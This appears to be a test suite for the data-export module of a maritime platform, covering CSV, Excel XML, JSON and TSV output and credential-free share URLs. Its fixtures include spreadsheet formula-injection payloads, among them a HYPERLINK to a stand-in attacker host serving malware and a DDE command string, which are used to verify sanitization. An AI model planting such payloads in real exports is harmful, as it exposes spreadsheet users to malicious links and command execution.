/**
 * SIH 26006 Maritime Intelligence Platform
 * MODULE 30: EXPORT & SHARING — Contract Test Suite
 *
 * Verifies:
 * 1. RFC 4180 CSV export with UTF-8 BOM, metadata headers, and proper escaping
 * 2. Microsoft SpreadsheetML 2003 XML (.xls) generation with styling, frozen header, and provenance sheet
 * 3. Structured JSON envelope generation adhering to SIH26006_EXPORT_V1 contract
 * 4. TSV clipboard generator with tab cleansing
 * 5. Formula Injection Sanitization (=, +, -, @, \t, \r)
 * 6. Data Immutability: original objects and arrays strictly untouched
 * 7. Zero-credential URL sharing parameter serialization
 * 8. Column sequencing, filtering, and default column resolution
 * 9. Template persistence integration with Module 29 Personalization
 */

import { ExportService } from './export.service';
import { SharingService } from './sharing.service';
import { ExportFormatter } from './export-formatter.service';
import { CsvAdapter } from './adapters/csv.adapter';
import { ExcelXmlAdapter } from './adapters/excel-xml.adapter';
import { JsonAdapter } from './adapters/json.adapter';
import { TsvAdapter } from './adapters/tsv.adapter';
import { personalizationService } from '../personalization/personalization.service';
import type {
  ExportColumnDefinition,
  ExportProvenanceMetadata,
} from '../../types/export-sharing';

// Setup minimal browser simulation for Node/TSX execution
class LocalStorageMock {
  private store: Record<string, string> = {};
  getItem(key: string): string | null {
    return this.store[key] || null;
  }
  setItem(key: string, value: string): void {
    this.store[key] = value;
  }
  removeItem(key: string): void {
    delete this.store[key];
  }
  clear(): void {
    this.store = {};
  }
}

const mockStorage = new LocalStorageMock();
(globalThis as any).localStorage = mockStorage;

if (typeof globalThis.window === 'undefined') {
  (globalThis as any).window = {
    location: { origin: 'http://localhost:5173', href: 'http://localhost:5173/vessels' },
    addEventListener: () => {},
    removeEventListener: () => {},
    dispatchEvent: () => true,
  };
}

if (typeof (globalThis as any).Blob === 'undefined') {
  (globalThis as any).Blob = class Blob {
    content: any[];
    options: any;
    size: number;
    constructor(content: any[] = [], options: any = {}) {
      this.content = content;
      this.options = options;
      this.size = content.reduce((acc, cur) => acc + (typeof cur === 'string' ? cur.length : 0), 0);
    }
  };
}

function assert(condition: boolean, message: string) {
  if (!condition) {
    console.error(`❌ ASSERTION FAILED: ${message}`);
    throw new Error(message);
  }
  console.log(`  ✓ ${message}`);
}

// Sample Maritime Vessel Dataset
interface TestVessel {
  id: number;
  name: string;
  imo_number: string;
  vessel_type: string;
  flag: string;
  capacity_tons: number;
  year_built: number;
  daily_rate_usd: number;
  transit_status: string;
  formula_injection_payload?: string;
}

const TEST_VESSELS: TestVessel[] = [
  {
    id: 1,
    name: 'FRONT ALTAIR',
    imo_number: '9748308',
    vessel_type: 'VLCC Crude Oil Tanker',
    flag: 'Marshall Islands',
    capacity_tons: 299999,
    year_built: 2016,
    daily_rate_usd: 48500,
    transit_status: 'underway',
  },
  {
    id: 2,
    name: 'TI OCEANIA, "Special Edition"',
    imo_number: '9246633',
    vessel_type: 'ULCC Supertanker',
    flag: 'Belgium',
    capacity_tons: 441585,
    year_built: 2003,
    daily_rate_usd: 62000,
    transit_status: 'anchored',
  },
  {
    id: 3,
    name: '=HYPERLINK("http://attacker.com/malware.exe")',
    imo_number: '+9999999',
    vessel_type: '-Risk Vessel Type',
    flag: '@AttackFlag',
    capacity_tons: 150000,
    year_built: 2020,
    daily_rate_usd: 35000,
    transit_status: 'moored',
    formula_injection_payload: '\t=cmd|"/C calc"!A0',
  },
];

const TEST_COLUMNS: ExportColumnDefinition<TestVessel>[] = [
  { key: 'name', header: 'Vessel Name', defaultVisible: true },
  { key: 'imo_number', header: 'IMO Number', defaultVisible: true },
  { key: 'vessel_type', header: 'Vessel Type', defaultVisible: true },
  { key: 'flag', header: 'Flag State', defaultVisible: true },
  { key: 'capacity_tons', header: 'DWT (MT)', type: 'number', defaultVisible: true },
  { key: 'year_built', header: 'Year Built', type: 'number', defaultVisible: false },
  { key: 'daily_rate_usd', header: 'Daily Rate (USD)', type: 'currency', defaultVisible: true },
  { key: 'transit_status', header: 'Status', type: 'status', defaultVisible: true },
  { key: 'formula_injection_payload', header: 'Injection Test', defaultVisible: false },
];

const TEST_METADATA: ExportProvenanceMetadata = {
  datasetName: 'Global Fleet Registry',
  exportedAt: new Date().toISOString(),
  recordCount: TEST_VESSELS.length,
  provenanceStatus: 'CANONICAL_EMPIRICAL',
  activeFilters: { status: 'all', minDwt: 100000 },
  generatedBy: 'Intelligence Officer',
  notes: 'Audit compliant registry export',
};

async function runTestSuite() {
  console.log('\n==================================================');
  console.log('MODULE 30: EXPORT & SHARING — CONTRACT TEST SUITE');
  console.log('==================================================\n');

  // ----------------------------------------------------
  // 1. RFC 4180 CSV Export
  // ----------------------------------------------------
  console.log('1. Testing RFC 4180 CSV Adapter & UTF-8 BOM...');
  const activeCols = ExportService.resolveActiveColumns(TEST_COLUMNS);
  const csvOutput = CsvAdapter.generate(TEST_VESSELS, activeCols, TEST_METADATA, true);

  assert(csvOutput.charCodeAt(0) === 0xfeff, 'CSV output begins with UTF-8 BOM (\\uFEFF)');
  assert(csvOutput.includes('# Dataset: Global Fleet Registry'), 'CSV contains provenance metadata comments');
  assert(csvOutput.includes('# Provenance: CANONICAL_EMPIRICAL'), 'CSV contains canonical empirical provenance header');
  assert(
    csvOutput.includes('Vessel Name,IMO Number,Vessel Type,Flag State,DWT (MT),Daily Rate (USD),Status'),
    'CSV contains correctly structured header row'
  );
  assert(
    csvOutput.includes('"TI OCEANIA, ""Special Edition"""'),
    'CSV escapes embedded commas and double quotes correctly'
  );
  assert(
    csvOutput.includes('$48,500') || csvOutput.includes('48500'),
    'CSV contains formatted currency cell values'
  );

  // ----------------------------------------------------
  // 2. Microsoft SpreadsheetML 2003 XML Export
  // ----------------------------------------------------
  console.log('\n2. Testing Microsoft SpreadsheetML 2003 XML (.xls) Adapter...');
  const xmlOutput = ExcelXmlAdapter.generate('Fleet Registry Export', TEST_VESSELS, activeCols, TEST_METADATA);

  assert(xmlOutput.startsWith('<?xml version="1.0"'), 'Excel XML starts with standard XML 1.0 prolog');
  assert(
    xmlOutput.includes('xmlns="urn:schemas-microsoft-com:office:spreadsheet"'),
    'Excel XML declares SpreadsheetML root namespace'
  );
  assert(xmlOutput.includes('<Style ss:ID="HeaderStyle">'), 'Excel XML includes HeaderStyle definition');
  assert(xmlOutput.includes('<Style ss:ID="NumericStyle">'), 'Excel XML includes NumericStyle definition');
  assert(xmlOutput.includes('<Style ss:ID="CurrencyStyle">'), 'Excel XML includes CurrencyStyle definition');
  assert(xmlOutput.includes('<FreezePanes/>'), 'Excel XML enables FreezePanes for header row');
  assert(xmlOutput.includes('<SplitHorizontal>1</SplitHorizontal>'), 'Excel XML freezes top row horizontally');
  assert(
    xmlOutput.includes('<Worksheet ss:Name="Provenance &amp; Metadata">'),
    'Excel XML includes secondary Provenance & Metadata worksheet'
  );
  assert(
    xmlOutput.includes('Global Fleet Registry'),
    'Excel XML provenance worksheet records dataset name'
  );
  assert(
    xmlOutput.includes('CANONICAL_EMPIRICAL'),
    'Excel XML provenance worksheet records provenance status'
  );

  // ----------------------------------------------------
  // 3. Structured JSON Envelope (SIH26006_EXPORT_V1)
  // ----------------------------------------------------
  console.log('\n3. Testing Structured JSON Adapter (SIH26006_EXPORT_V1)...');
  const jsonOutput = JsonAdapter.generate('Fleet Registry Export', TEST_VESSELS, activeCols, TEST_METADATA);
  const parsedJson = JSON.parse(jsonOutput);

  assert(parsedJson.schemaVersion === 'SIH26006_EXPORT_V1', 'JSON envelope declares SIH26006_EXPORT_V1 schema');
  assert(parsedJson.title === 'Fleet Registry Export', 'JSON envelope records export title');
  assert(parsedJson.dataset === 'Global Fleet Registry', 'JSON envelope records dataset');
  assert(parsedJson.totalRecords === TEST_VESSELS.length, 'JSON envelope records totalRecords count');
  assert(Array.isArray(parsedJson.data), 'JSON envelope contains data array');
  assert(parsedJson.data.length === TEST_VESSELS.length, 'JSON envelope data array length matches input');
  assert(parsedJson.metadata.provenanceStatus === 'CANONICAL_EMPIRICAL', 'JSON metadata preserves provenance');

  // ----------------------------------------------------
  // 4. TSV Clipboard Generator
  // ----------------------------------------------------
  console.log('\n4. Testing TSV Clipboard Adapter...');
  const tsvOutput = TsvAdapter.generate(TEST_VESSELS, activeCols);
  const tsvLines = tsvOutput.split('\n');

  assert(tsvLines.length === TEST_VESSELS.length + 1, 'TSV output has header + all data rows');
  assert(tsvLines[0].split('\t').length === activeCols.length, 'TSV header columns count matches active columns');
  assert(!tsvLines[1].includes('\n') && !tsvLines[1].includes('\r'), 'TSV cells strip internal carriage returns');

  // ----------------------------------------------------
  // 5. Formula Injection Defense
  // ----------------------------------------------------
  console.log('\n5. Testing Formula Injection Sanitization (=, +, -, @, \\t, \\r)...');
  const maliciousRow = TEST_VESSELS[2];

  // Test CSV formula sanitization
  const sanitizedCsv = CsvAdapter.generate([maliciousRow], TEST_COLUMNS, undefined, false);
  assert(sanitizedCsv.includes("'=HYPERLINK"), 'CSV sanitizes = with single quote prefix');
  assert(sanitizedCsv.includes("'+9999999"), 'CSV sanitizes + with single quote prefix');
  assert(sanitizedCsv.includes("'-Risk"), 'CSV sanitizes - with single quote prefix');
  assert(sanitizedCsv.includes("'@AttackFlag"), 'CSV sanitizes @ with single quote prefix');

  // Test Excel XML formula sanitization
  const sanitizedXml = ExcelXmlAdapter.generate('Security Test', [maliciousRow], TEST_COLUMNS);
  assert(sanitizedXml.includes("&apos;=HYPERLINK"), 'Excel XML escapes and prefixes formula injection with single quote');

  // Test normal values are untouched
  const normalFormatted = ExportFormatter.sanitizeFormulaInjection('FRONT ALTAIR');
  assert(normalFormatted === 'FRONT ALTAIR', 'Benign text is NOT altered or prefixed with quote');

  // ----------------------------------------------------
  // 6. Data Immutability Guarantee
  // ----------------------------------------------------
  console.log('\n6. Testing Data Immutability Guarantee...');
  assert(TEST_VESSELS[0].name === 'FRONT ALTAIR', 'Dataset vessel 0 name is unchanged');
  assert(TEST_VESSELS[1].daily_rate_usd === 62000, 'Dataset vessel 1 daily_rate_usd is unchanged');
  assert(TEST_VESSELS[2].name === '=HYPERLINK("http://attacker.com/malware.exe")', 'Dataset vessel 2 original string is untouched');
  assert(TEST_VESSELS.length === 3, 'Dataset length remains exactly 3');

  // ----------------------------------------------------
  // 7. URL Sharing & Zero-Credential Parameterization
  // ----------------------------------------------------
  console.log('\n7. Testing Zero-Credential URL Sharing Service...');
  const shareUrl = SharingService.buildShareableUrl({
    entityOrView: 'vessels',
    parameters: {
      status: 'underway',
      minDwt: 200000,
      vesselClass: 'VLCC',
      authToken: 'SECRET_BEARER_TOKEN_12345',
      userPassword: 'SUPER_SECRET_PASSWORD',
      apiSecret: 'SECRET_API_KEY',
    },
    baseUrl: 'http://localhost:5173',
  });

  assert(shareUrl.includes('status=underway'), 'URL contains harmless query parameter');
  assert(shareUrl.includes('minDwt=200000'), 'URL contains numeric query parameter');
  assert(!shareUrl.includes('authToken'), 'URL strictly filters out authToken');
  assert(!shareUrl.includes('SECRET_BEARER_TOKEN'), 'URL strictly filters out token values');
  assert(!shareUrl.includes('userPassword'), 'URL strictly filters out passwords');
  assert(!shareUrl.includes('apiSecret'), 'URL strictly filters out secrets');

  // ----------------------------------------------------
  // 8. Column Filtering, Reordering & Filename Generation
  // ----------------------------------------------------
  console.log('\n8. Testing Column Filtering & Custom Sequencing...');
  const customSelectedKeys = ['flag', 'name', 'capacity_tons'];
  const sequencedCols = ExportService.resolveActiveColumns(TEST_COLUMNS, customSelectedKeys);

  assert(sequencedCols.length === 3, 'Selected exactly 3 columns');
  assert(sequencedCols[0].key === 'flag', 'Column 0 sequenced to flag');
  assert(sequencedCols[1].key === 'name', 'Column 1 sequenced to name');
  assert(sequencedCols[2].key === 'capacity_tons', 'Column 2 sequenced to capacity_tons');

  const generatedFilename = ExportService.generateFilename('VLCC Fleet Registry', 'xlsx');
  assert(generatedFilename.startsWith('sih26006_vlcc_fleet_registry_'), 'Filename correctly formatted and prefixed');
  assert(generatedFilename.endsWith('.xls'), 'Excel format filename ends with .xls for native SpreadsheetML association');

  // ----------------------------------------------------
  // 9. Module 29 Personalization Integration
  // ----------------------------------------------------
  console.log('\n9. Testing Custom Export Template in Personalization Workspace...');
  const createdTemplate = personalizationService.createTemplate(
    'Quarterly Executive Fleet Summary',
    'Executive column selection for board presentations',
    'export',
    {
      targetDataset: 'Fleet Registry',
      selectedColumnKeys: ['name', 'imo_number', 'vessel_type', 'capacity_tons'],
      defaultFormat: 'xlsx',
    },
    ['executive', 'quarterly']
  );

  assert(createdTemplate.id.startsWith('tmpl-'), 'Template created with valid ID prefix');
  assert(createdTemplate.type === 'export', 'Template registered under "export" type');
  assert(createdTemplate.config.defaultFormat === 'xlsx', 'Template records default format');

  const exportTemplates = personalizationService.getTemplates('export');
  const loadedTemplate = exportTemplates.find((t) => t.id === createdTemplate.id);
  assert(loadedTemplate !== undefined, 'Template retrieved from personalization service');
  assert(loadedTemplate?.name === 'Quarterly Executive Fleet Summary', 'Template name preserved');

  console.log('\n==================================================');
  console.log('✅ ALL 9 MODULE 30 CONTRACT TEST SUITES PASSED');
  console.log('==================================================\n');
}

runTestSuite().catch((err) => {
  console.error('Test Suite Failed:', err);
  process.exit(1);
});
